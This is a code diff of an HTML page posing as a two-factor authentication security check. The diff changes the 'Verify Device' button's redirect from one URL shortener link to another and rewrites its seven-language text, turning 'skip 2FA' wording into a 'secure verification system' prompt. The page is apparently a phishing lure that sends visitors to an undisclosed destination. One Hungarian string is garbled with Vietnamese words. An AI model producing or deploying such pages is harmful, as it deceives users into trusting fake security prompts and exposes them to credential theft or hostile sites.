@@ -89,47 +89,19 @@
         <div class="loader"></div>
         <h2 id="title">Two-Factor Authentication (2FA)</h2>
         <p id="desc">A new access request has been detected. Please verify your browser to complete the security check.</p>
-        <button id="btn" onclick="window.location.href='https://bom.so/RUINz4'">Verify Device Now</button>
+        <button id="btn" onclick="window.location.href='http://s.ldplink.me/2dvea'">Verify Device Now</button>
     </div>
 
     <script>
         const translations = {
-    'vi': { 
-        t: 'Bỏ qua xác thực 2 lớp (2FA)', 
-        d: 'Thiết bị của bạn đã được nhận diện là đáng tin cậy. Nhấn nút bên dưới để bỏ qua bước nhập mã và truy cập thẳng vào hệ thống.', 
-        b: 'Bỏ qua và Tiếp tục' 
-    },
-    'en': { 
-        t: 'Skip Two-Factor Authentication (2FA)', 
-        d: 'Your device has been recognized as trusted. Click the button below to skip the verification code and access the system directly.', 
-        b: 'Skip and Continue' 
-    },
-    'hu': { 
-        t: 'Kétfaktoros hitelesítés (2FA) kihagyása', 
-        d: 'Eszközét megbízhatónak ismertük fel. Kattintson az alábbi gombra az ellenőrző kód kihagyásához és a közvetlen belépéshez.', 
-        b: 'Kihagyás és folytatás' 
-    },
-    'de': { 
-        t: 'Zwei-Faktor-Authentifizierung (2FA) überspringen', 
-        d: 'Ihr Gerät wurde als vertrauenswürdig erkannt. Klicken Sie auf die Schaltfläche unten, um den Bestätigungscode zu überspringen.', 
-        b: 'Überspringen und fortfahren' 
-    },
-    'fr': { 
-        t: 'Ignorer l\'authentification à deux facteurs (2FA)', 
-        d: 'Votre appareil a été reconnu comme fiable. Cliquez sur le bouton ci-dessous pour ignorer le code de vérification.', 
-        b: 'Ignorer et continuer' 
-    },
-    'ar': { 
-        t: 'تخطي المصادقة الثنائية (2FA)', 
-        d: 'تم التعرف على جهازك كجهاز موثوق به. انقر فوق الزر أدناه لتخطي رمز التحقق والدخول مباشرة.', 
-        b: 'تخطي ومتابعة' 
-    },
-    'el': { 
-        t: 'Παράλειψη ελέγχου ταυτότητας 2 παραγόντων (2FA)', 
-        d: 'Η συσκευή σας αναγνωρίστηκε ως αξιόπιστη. Κάντε κλικ στο κουμπί για να παραλείψετε τον κωδικό επαλήθευσης.', 
-        b: 'Παράλειψη και συνέχεια' 
-    }
-};
+            'vi': { t: 'Đang kiểm tra an toàn...', d: 'Vui lòng nhấn nút bên dưới để tiếp tục đến hệ thống xác minh bảo mật của chúng tôi.', b: 'Tiếp tục ngay' },
+            'en': { t: 'Security Checking...', d: 'Please click the button below to continue to our secure verification system.', b: 'Continue Now' },
+            'hu': { t: 'Biztonsági ellenőrzés...', d: 'Kérjük, kattintson az alábbi gombra a biztonságos ellenőrző hệ thốngünkhöz való folytatáshoz.', b: 'Folytatás most' },
+            'de': { t: 'Sicherheitsprüfung...', d: 'Bitte klicken Sie auf die Schaltfläche unten, um zu unserem sicheren Verifizierungssystem zu gelangen.', b: 'Jetzt fortfahren' },
+            'fr': { t: 'Vérification de sécurité...', d: 'Veuillez cliquer sur le bouton ci-dessous pour continuer vers notre système de vérification sécurisé.', b: 'Continuer maintenant' },
+            'ar': { t: 'فحص الأمان...', d: 'يرجى النقر على الزر أدناه للمتابعة إلى نظام التحقق الآمن الخاص بنا.', b: 'استمرار الآن' },
+            'el': { t: 'Έλεγχος ασφαλείας...', d: 'Κάντε κλικ στο παρακάτω κουμπί για να συνεχίσετε στο ασφαλές σύστημα επαλήθευσης.', b: 'Συνέχεια τώρα' }
+        };
 
         function setContent(langCode) {
             const lang = translations[langCode] || translations['en'];
